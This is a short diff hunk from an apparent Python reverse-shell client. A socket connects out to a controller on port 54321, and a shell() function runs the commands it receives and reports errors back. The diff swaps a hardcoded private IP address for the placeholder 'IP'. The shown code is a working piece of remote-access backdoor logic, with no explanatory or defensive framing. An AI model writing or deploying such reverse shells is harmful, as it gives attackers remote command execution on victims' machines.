@@ -31,7 +31,7 @@ def shell():
                 reliable_send(f"[!!] Can't execute that command: {str(e)}")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("192.168.0.167", 54321))
+sock.connect(("IP", 54321))
 print("Connection established")
 shell()
 sock.close()
